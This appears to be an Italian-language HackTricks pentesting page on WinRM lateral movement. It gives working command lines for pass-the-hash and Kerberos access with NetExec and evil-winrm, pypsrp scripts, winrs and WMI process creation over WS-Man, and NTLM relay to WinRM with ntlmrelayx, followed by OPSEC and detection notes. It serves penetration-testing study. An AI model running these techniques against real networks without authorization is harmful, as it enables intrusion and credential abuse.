# WinRM

{{#include ../../banners/hacktricks-training.md}}

WinRM è uno dei trasporti più pratici per il **lateral movement** negli ambienti Windows, perché fornisce una shell remota tramite **WS-Man/HTTP(S)** senza bisogno di trucchi per creare servizi SMB. Se il target espone **5985/5986** e il tuo principal è autorizzato a usare il remoting, spesso puoi passare da "creds valide" a una "shell interattiva" molto rapidamente.

Per l'**enumerazione del protocollo/servizio**, i listener, l'abilitazione di WinRM, `Invoke-Command` e l'uso generico dei client, consulta:

{{#ref}}
../../network-services-pentesting/5985-5986-pentesting-winrm.md
{{#endref}}

## Perché gli operatori apprezzano WinRM

- Usa **HTTP/HTTPS** invece di SMB/RPC, quindi spesso funziona dove l'esecuzione in stile PsExec è bloccata.
- Con **Kerberos**, evita di inviare credenziali riutilizzabili al target.
- Funziona bene con strumenti per **Windows**, **Linux** e **Python** (`winrs`, `evil-winrm`, `pypsrp`, `netexec`).
- Il percorso interattivo di PowerShell remoting avvia **`wsmprovhost.exe`** sul target nel contesto dell'utente autenticato, un comportamento operativo diverso dall'esecuzione basata su servizi.

## Modello di accesso e prerequisiti

In pratica, il successo del lateral movement tramite WinRM dipende da **tre** fattori:

1. Il target ha un **listener WinRM** (`5985`/`5986`) e regole firewall che consentono l'accesso.
2. L'account può **autenticarsi** all'endpoint.
3. L'account è autorizzato ad **aprire una sessione di remoting**.

Modi comuni per ottenere tale accesso:

- **Amministratore locale** sul target.
- Appartenenza al gruppo **Remote Management Users** nei sistemi più recenti o a **WinRMRemoteWMIUsers__** nei sistemi/componenti che supportano ancora quel gruppo.
- Diritti di remoting delegati esplicitamente tramite descrittori di sicurezza locali / modifiche alle ACL di PowerShell remoting.

Se hai già il controllo di una macchina con diritti di amministratore, ricorda che puoi anche **delegare l'accesso a WinRM senza appartenere al gruppo degli amministratori** usando le tecniche descritte qui:

{{#ref}}
../active-directory-methodology/security-descriptors.md
{{#endref}}

### Aspetti dell'autenticazione da considerare durante il lateral movement

- **Kerberos richiede un hostname/FQDN**. Se ti connetti tramite IP, il client di solito passa a **NTLM/Negotiate**.
- Nei casi limite di **workgroup** o trust tra domini, NTLM richiede spesso **HTTPS** oppure che il target venga aggiunto a **TrustedHosts** sul client.
- Con account **locali** tramite Negotiate in un workgroup, le restrizioni UAC remote possono impedire l'accesso, a meno che non si usi l'account Administrator integrato o `LocalAccountTokenFilterPolicy=1`.
- Per impostazione predefinita, PowerShell remoting usa lo SPN **`HTTP/<host>`**. Negli ambienti in cui `HTTP/<host>` è già registrato a un altro account di servizio, Kerberos di WinRM può non funzionare e restituire `0x80090322`; usa uno SPN con porta oppure passa a **`WSMAN/<host>`** se tale SPN esiste.<sup>[[3]](#references)</sup>

Se ottieni credenziali valide durante il password spraying, verificarle tramite WinRM è spesso il modo più rapido per controllare se consentono di ottenere una shell:

{{#ref}}
../active-directory-methodology/password-spraying.md
{{#endref}}

## Lateral movement da Linux a Windows

### NetExec / CrackMapExec per la verifica e l'esecuzione one-shot

```bash
# Validate creds and execute a simple command
netexec winrm <HOST_FQDN> -u <USER> -p '<PASSWORD>' -x "whoami /all"

# Pass-the-Hash
netexec winrm <HOST_FQDN> -u <USER> -H <NTHASH> -x "hostname"

# PowerShell command instead of cmd.exe
netexec winrm <HOST_FQDN> -u <USER> -H <NTHASH> -X '$PSVersionTable'
```

### Evil-WinRM per shell interattive

`evil-winrm` resta l'opzione interattiva più pratica da Linux perché supporta **password**, **hash NT**, **ticket Kerberos**, **certificati client**, il trasferimento di file e il caricamento in memoria di PowerShell/.NET.

```bash
# Password
evil-winrm -i <HOST_FQDN> -u <USER> -p '<PASSWORD>'

# Pass-the-Hash
evil-winrm -i <HOST_FQDN> -u <USER> -H <NTHASH>

# Kerberos using an existing ccache/kirbi
export KRB5CCNAME=./user.ccache
evil-winrm -i <HOST_FQDN> -r <REALM.LOCAL>
```

### Caso limite Kerberos SPN: `HTTP` vs `WSMAN`

Quando lo SPN predefinito **`HTTP/<host>`** causa errori Kerberos, prova invece a richiedere/usare un ticket **`WSMAN/<host>`**. Questo può verificarsi in ambienti aziendali con configurazioni rafforzate o insolite, dove **`HTTP/<host>`** è già associato a un altro account di servizio.<sup>[[3]](#references)</sup>

```bash
# Example: use a WSMAN ticket instead of the default HTTP SPN
export KRB5CCNAME=administrator@WSMAN_srv01.domain.local@DOMAIN.LOCAL.ccache
evil-winrm -i srv01.domain.local -r DOMAIN.LOCAL --spn WSMAN
```

Questo è utile anche dopo un abuso di **RBCD / S4U**, quando hai forgiato o richiesto specificamente un service ticket **WSMAN** invece di un ticket generico `HTTP`.

### Autenticazione basata su certificati

WinRM supporta anche l'**autenticazione tramite certificato client**, ma il certificato deve essere mappato a un **account locale** sul sistema di destinazione. Dal punto di vista offensivo, questo è rilevante quando:

- hai già sottratto/esportato un certificato client valido e la relativa chiave privata, mappati per WinRM;
- hai abusato di **AD CS / Pass-the-Certificate** per ottenere un certificato per un principal e poi passare a un altro percorso di autenticazione;
- operi in ambienti che evitano deliberatamente il remoting basato su password.

```bash
evil-winrm -i <HOST_FQDN> -S -c user.crt -k user.key
```

L'autenticazione WinRM con certificato client è molto meno comune dell'autenticazione con password/hash/Kerberos, ma, quando è disponibile, può offrire un percorso di **movimento laterale senza password** che resta utilizzabile anche dopo la rotazione della password.

### Python / automazione con `pypsrp`

Se ti serve automazione invece di una shell per l'operatore, `pypsrp` consente di usare WinRM/PSRP da Python e supporta **NTLM**, **autenticazione con certificato**, **Kerberos** e **CredSSP**.<sup>[[2]](#references)</sup>

```python
from pypsrp.client import Client

client = Client(
    "srv01.domain.local",
    username="DOMAIN\\user",
    password="Password123!",
    ssl=False,
)
stdout, stderr, rc = client.execute_cmd("whoami /all")
print(stdout, stderr, rc)
```


Se hai bisogno di un controllo più granulare rispetto al wrapper di alto livello `Client`, le API di livello inferiore `WSMan` + `RunspacePool` sono utili per due problemi operativi comuni:

- forzare **`WSMAN`** come servizio/SPN Kerberos invece dell’aspettativa predefinita **`HTTP`** usata da molti client PowerShell;
- connettersi a un endpoint PSRP **non predefinito**, come una configurazione di sessione **JEA** / personalizzata, invece di `Microsoft.PowerShell`.

```python
from pypsrp.wsman import WSMan
from pypsrp.powershell import PowerShell, RunspacePool

wsman = WSMan(
    "srv01.domain.local",
    auth="kerberos",
    ssl=False,
    negotiate_service="WSMAN",
)

with wsman, RunspacePool(wsman, configuration_name="MyJEAEndpoint") as pool, PowerShell(pool) as ps:
    ps.add_script("whoami; Get-Command")
    output = ps.invoke()
    print(output)
```

### Gli endpoint PSRP personalizzati e JEA sono importanti durante il movimento laterale

Un'autenticazione WinRM riuscita **non** significa sempre che si ottenga accesso all'endpoint predefinito e senza restrizioni `Microsoft.PowerShell`. Gli ambienti maturi possono esporre **configurazioni di sessione personalizzate** o endpoint **JEA**, con ACL e modalità di esecuzione con identità specifiche.<sup>[[1]](#references)</sup>

Se hai già ottenuto l'esecuzione di codice su un host Windows e vuoi capire quali superfici di remoting sono disponibili, enumera gli endpoint registrati:

```powershell
Get-PSSessionConfiguration | Select-Object Name, Permission
```

Quando è disponibile un endpoint utile, specifica esplicitamente quello invece della shell predefinita:

```powershell
Enter-PSSession -ComputerName srv01.domain.local -ConfigurationName MyJEAEndpoint
```

Implicazioni offensive pratiche:

- Un endpoint **restricted** può comunque bastare per il lateral movement se espone solo i cmdlet/funzioni giusti per il controllo dei servizi, l'accesso ai file, la creazione di processi o l'esecuzione arbitraria di comandi .NET / esterni.
- Un ruolo **JEA misconfigured** è particolarmente prezioso quando espone comandi pericolosi come `Start-Process`, wildcard ampie, provider scrivibili o funzioni proxy personalizzate che consentono di evadere le restrizioni previste.
- Gli endpoint basati su account virtuali **RunAs** o **gMSA** modificano il contesto di sicurezza effettivo dei comandi eseguiti. In particolare, un endpoint basato su gMSA può fornire un'**identità di rete al secondo hop** anche quando una normale sessione WinRM incontrerebbe il classico problema di delegation.

Per un endpoint personalizzato con restrizioni, esamina separatamente i permessi effettivi per i comandi e gli script: un breve elenco `Get-Command` da solo non dimostra che uno script `.ps1` esistente non possa essere eseguito. Le [JEA role capabilities](https://learn.microsoft.com/en-us/powershell/scripting/security/remoting/jea/role-capabilities) controllano esplicitamente quali percorsi di script possono essere invocati; altri endpoint personalizzati possono applicare regole di sessione diverse. Se uno script consentito usa una `SecureString` memorizzata per creare una credenziale per un altro host, un blob creato senza una chiave esplicita usa [Windows DPAPI](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/convertfrom-securestring) e in genere richiede il contesto dell'utente e del computer che lo proteggono per essere decrittato. Prima di considerare il sorgente scrivibile o un blob copiato come una via di privilege escalation tra host, verifica l'ACL dello script, l'invocazione consentita, l'identità RunAs e i diritti sulle credenziali a valle. Non stampare il valore protetto durante l'enumerazione passiva.

Per una funzione personalizzata JEA che accetta un percorso di file, esamina insieme l'ACL dell'endpoint registrato, la role capability associata e l'identità RunAs effettiva. Un chiamante può avere `NoLanguage` mentre il corpo della funzione viene eseguito nella modalità linguistica predefinita del sistema; inoltre, un account virtuale può avere diritti di amministratore locale. Se la funzione verifica una directory consentita usando un prefisso di stringa grezzo e poi legge il percorso fornito, i componenti `..` possono risolversi al di fuori di tale directory. Il confine è il percorso risolto sotto l'identità della funzione, non la modalità linguistica del chiamante né il prefisso apparente. Verifica che la funzione sia raggiungibile e che convalidi il percorso finale prima di considerare la leggibilità di un file `.psrc` o `.pssc` come una vulnerabilità di lettura di file privilegiata. Consulta le indicazioni Microsoft su [JEA role capability](https://learn.microsoft.com/en-us/powershell/scripting/security/remoting/jea/role-capabilities) e [security considerations](https://learn.microsoft.com/en-us/powershell/scripting/security/remoting/jea/security-considerations).

## Lateral movement tramite WinRM nativo di Windows

### `winrs.exe`

`winrs.exe` è integrato ed è utile quando vuoi **eseguire comandi tramite WinRM nativo** senza avviare una sessione interattiva di PowerShell remoting:

```cmd
winrs -r:srv01.domain.local cmd /c whoami
winrs -r:https://srv01.domain.local:5986 -u:DOMAIN\\user -p:Password123! hostname
```

Due flag sono facili da dimenticare e contano nella pratica:

- `/noprofile` è spesso necessario quando il principal remoto **non** è un amministratore locale.
- `/allowdelegate` consente alla shell remota di usare le tue credenziali con un **terzo host** (per esempio, quando il comando richiede `\\fileserver\share`).

```cmd
winrs -r:srv01.domain.local /noprofile cmd /c set
winrs -r:srv01.domain.local /allowdelegate cmd /c dir \\fileserver.domain.local\share
```

Dal punto di vista operativo, `winrs.exe` produce comunemente una catena di processi remoti simile a:

```text
svchost.exe (DcomLaunch) -> winrshost.exe -> cmd.exe /c <command>
```

Vale la pena ricordarlo perché è diverso dall'esecuzione basata sui servizi e dalle sessioni PSRP interattive.

### `winrm.cmd` / WS-Man COM invece di PowerShell remoting

Puoi anche eseguire comandi tramite **trasporto WinRM** senza usare `Enter-PSSession`, invocando classi WMI su WS-Man. In questo modo il trasporto rimane WinRM, mentre il meccanismo di esecuzione remota diventa **WMI `Win32_Process.Create`**:

```cmd
winrm invoke Create wmicimv2/Win32_Process @{CommandLine="cmd.exe /c whoami > C:\\Windows\\Temp\\who.txt"} -r:srv01.domain.local
```

Questo approccio è utile quando:

- Il logging di PowerShell è monitorato attentamente.
- Vuoi **il trasporto WinRM**, ma non il classico flusso di lavoro PS remoting.
- Stai sviluppando o usando strumenti personalizzati basati sull'oggetto COM **`WSMan.Automation`**.

## NTLM relay verso WinRM (WS-Man)

Quando il relay SMB è bloccato dalla firma e il relay LDAP è limitato, **WS-Man/WinRM** può comunque essere un obiettivo interessante per il relay. `ntlmrelayx.py` moderno include **server WinRM relay** e può inoltrare le autenticazioni verso obiettivi **`wsman://`** o **`winrms://`**.

```bash
# Relay to HTTP WinRM
ntlmrelayx.py -t wsman://srv01.domain.local --no-smb-server -smb2support

# Relay to HTTPS WinRM
ntlmrelayx.py -t winrms://srv01.domain.local --no-smb-server -smb2support
```

Due note pratiche:

- Relay è più utile quando il target accetta **NTLM** e il principal inoltrato è autorizzato a usare WinRM.
- Il codice recente di Impacket gestisce specificamente le richieste **`WSMANIDENTIFY: unauthenticated`**, così le probe in stile `Test-WSMan` non interrompono il flusso di relay.

Per i vincoli multi-hop dopo aver ottenuto una prima sessione WinRM, consulta:

{{#ref}}
../active-directory-methodology/kerberos-double-hop-problem.md
{{#endref}}

## Note su OPSEC e rilevamento

- **Interactive PowerShell remoting** di solito crea **`wsmprovhost.exe`** sul target.
- **`winrs.exe`** crea comunemente **`winrshost.exe`** e poi il processo figlio richiesto.
- Gli endpoint **JEA** personalizzati possono eseguire azioni come account virtuali **`WinRM_VA_*`** o come **gMSA** configurato, modificando sia la telemetria sia il comportamento del second hop rispetto a una shell nel normale contesto utente.<sup>[[1]](#references)</sup>
- Se usi PSRP anziché `cmd.exe` grezzo, aspettati telemetria di **network logon**, eventi del servizio WinRM e logging operativo/script-block di PowerShell.
- Se ti serve un solo comando, `winrs.exe` o l'esecuzione WinRM one-shot potrebbero essere più discreti di una sessione remota interattiva di lunga durata.
- Se Kerberos è disponibile, preferisci **FQDN + Kerberos** rispetto a IP + NTLM per ridurre sia i problemi di trust sia le scomode modifiche client-side a `TrustedHosts`.

## References

- [1] [Microsoft: considerazioni sulla sicurezza di JEA](https://learn.microsoft.com/en-us/powershell/scripting/security/remoting/jea/security-considerations?view=powershell-7.6)
- [2] [README di pypsrp](https://github.com/jborean93/pypsrp)
- [3] [Microsoft: errore `0x80090322` quando si connette PowerShell a un server remoto tramite WinRM](https://learn.microsoft.com/en-us/troubleshoot/windows-server/system-management-components/error-0x80090322-when-connecting-powershell-to-remote-server-via-winrm)
{{#include ../../banners/hacktricks-training.md}}
